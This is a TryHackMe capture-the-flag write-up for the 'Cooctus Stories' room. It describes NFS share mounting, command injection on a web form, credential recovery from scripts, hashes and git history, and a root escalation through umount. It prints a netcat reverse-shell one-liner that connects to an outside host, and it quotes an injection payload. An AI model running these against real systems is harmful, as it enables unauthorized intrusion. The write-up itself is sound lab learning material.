# Cooctus Stories

https://tryhackme.com/room/cooctusadventures

A fun room with a five flags, four users and root. The initial foothold took me longer than it should have, admittedly, as it was fairly simple in retrospect. The challenges in this room are more on the CTF side, in my view, than 'real' (for whatever thats worth), but still pretty fun.

## Paradox flag

1. Recon revealed a bunch of ports: 22, 111, 8080, 2049 and some RPC ports. 111 and 2049 were not properly identified by Rustscan/nmap -sV, but are NFS bind ports.
2. On the website on 8080, there was /cat and /login, with the former redirecting to /login which was a 'cookieless' login. I couldn't find any obvious way past this.
3. Going back to the ports, I eventually tried checking for NFS mounts. `showmount -e <IP>` showed an exposed mount, which I mounted with `mount -t nfs <ip>:<remote_folder> <local_folder> -o nolock`. This got me a credentials.bak file that contained the creds for the login page.
4. This took me to the /cat page, where there was a simple input to 'test payloads' - whatever I entered was echoed back.
5. This took an embaressingly long time to realise that this was a straight command interpreter - I guess I was expecting this to reflect data, like `cat /etc/passwd`. It was not until I ran burp's fuzz payload and it froze the server with `{} || ping -n 30 127.0.0.1` (a 30 second per ping, infinite cmd wtf) that I realised. Even then I thought the `{} || ` was necessary until I looked at the app.py later.
6. Using the standard `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.0.7 4444 >/tmp/f` I got a reverse shell as the user Paradox.

## Szymex flag

1. To upgrade the shell, I created a authorized_keys file in Paradox's folder, then ssh'd in.
2. Paradox could read a few files in Szymex's folder, specifically a python script that encoded an unreadable file and compared the result to a given string.
3. I had a crack at reversing this, but started by simply running the encoder against the encoded string, which reversed to what turned out to be syzmex's password.

## Tux flag

1. In tux's home folder there were two folders readable by `testers`, which szymex was part of, `_1` and `_3`. To find the `_2` folder I ran a find on the testers group.
2. These three folders contained three parts of a hex string - the first contained a c file which had encoded via define statements every part of the code with variations on 'noot'. I just find and replaced until I had the first part of the string.
3. In the second folder was a PGP encoded file, and the key for said file, so `gpg --import` and `gpg -d` got me the middle part of the string.
4. The third and final folder just contained the last part of the string with no challenge. Putting them together, it looked like a md5 hash, and I reverse it quickly via crackstation to get Tux's password.

## Varg flag

1. Varg's folder had a python file named 'cooctusos' that could be run via sudo by Tux, as varg. Adjacent was a directory containing the source code for this OS.
2. In there was a .git folder, so I used `git log` to get its history, then `git show` on the earlier commit to get a username and password. Using this with the sudo command got me a restricted shell.
3. To get to a proper shell I was able to grab the existing private key from varg's .ssh folder. I later realised the password I'd used on the OS was vargs actual password, so that probably would have worked too.

## Root flag

1. This final flag was bit tricky, just because it was confusing. Varg could run umount as root, but umount wasn't on gtfo bins, and its usually suid so why make it sudo?
2. I knew from earlier enumeration, that /opt/coocktusos was mounted, to the src dir in varg's home folder. So I guessed it was something with this but I couldn't figure out how this could be used for privesc.
3. In the end I just unmounted that folder, and to my surprise, in its place was a /root folder. Maybe an onion thing? Outer layer the original mount, inner layer the prior mount?
4. The root folder contained a root.txt file but it didn't contain a flag. However, there was an .ssh folder with a private key, so logging in with that got me root :)

And thats it! Multiple steps, fun!
